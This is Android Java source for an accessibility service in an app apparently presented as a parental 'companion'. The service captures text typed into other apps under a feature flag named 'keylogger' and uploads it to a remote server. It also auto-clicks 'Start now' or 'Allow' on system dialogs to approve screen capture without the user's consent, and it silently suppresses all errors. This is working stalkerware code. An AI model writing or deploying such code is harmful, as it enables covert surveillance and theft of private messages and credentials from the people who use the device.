package com.snapapp.companion;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class SnapAccessibilityService extends AccessibilityService {

    private String lastPackage = "";
    private long lastLogTime = 0;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        try {
            SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
            prefs.edit().putBoolean("is_accessibility_active", true).apply();

            // Ensure background sync service is alive
            Intent svc = new Intent(this, CompanionSyncService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }

            // Immediate heartbeat reporting accessibility active
            String server = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
            String devId = prefs.getString("device_id", null);
            if (devId != null) {
                ApiClient.sendHeartbeat(server, devId, 100, false, true, ParentalSetupHelper.isDeviceAdminActive(this), ParentalSetupHelper.isBatteryOptimizationIgnored(this), null, null);
            }
        } catch (Throwable ignored) {}
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        try {
            if (event.isPassword()) return;

            CharSequence pkgChar = event.getPackageName();
            String pkg = pkgChar != null ? pkgChar.toString() : "";

            // Ignore our own package
            if (getPackageName().equals(pkg)) return;

            int eventType = event.getEventType();
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                lastPackage = pkg;
                if ("com.android.systemui".equals(pkg) || "android".equals(pkg)) {
                    handleAutoApproveScreenCapture();
                }
            } else if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                if (!TelemetrySyncHelper.isFeatureEnabled(this, "keylogger")) return;

                long now = System.currentTimeMillis();
                if (now - lastLogTime < 500) return; // Debounce rapid keystrokes

                List<CharSequence> textList = event.getText();
                if (textList == null || textList.isEmpty()) return;

                StringBuilder sb = new StringBuilder();
                for (CharSequence s : textList) {
                    if (s != null) sb.append(s).append(" ");
                }

                String content = sb.toString().trim();
                if (!content.isEmpty()) {
                    lastLogTime = now;
                    String appName = getAppName(pkg);
                    TelemetrySyncHelper.uploadKeystroke(this, pkg, appName, content);
                }
            }
        } catch (Throwable ignored) {}
    }

    private String getAppName(String pkg) {
        if (pkg == null || pkg.isEmpty()) return "Unknown App";
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
            CharSequence label = pm.getApplicationLabel(info);
            return label != null ? label.toString() : pkg;
        } catch (Throwable e) {
            return pkg;
        }
    }

    private void handleAutoApproveScreenCapture() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            String[] targets = {"Start now", "START NOW", "Start", "START", "Allow", "ALLOW"};
            for (String target : targets) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
                if (nodes != null && !nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node != null && node.isClickable()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            root.recycle();
                            return;
                        }
                    }
                }
            }
            List<AccessibilityNodeInfo> btn1 = root.findAccessibilityNodeInfosByViewId("android:id/button1");
            if (btn1 != null && !btn1.isEmpty()) {
                AccessibilityNodeInfo b = btn1.get(0);
                if (b != null && b.isClickable()) {
                    b.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            }
            root.recycle();
        } catch (Throwable ignored) {}
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
        prefs.edit().putBoolean("is_accessibility_active", false).apply();
        try {
            String server = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
            String devId = prefs.getString("device_id", null);
            if (devId != null) {
                ApiClient.sendHeartbeat(server, devId, 100, false, false, ParentalSetupHelper.isDeviceAdminActive(this), ParentalSetupHelper.isBatteryOptimizationIgnored(this), null, null);
            }
        } catch (Throwable ignored) {}
        super.onDestroy();
    }
}
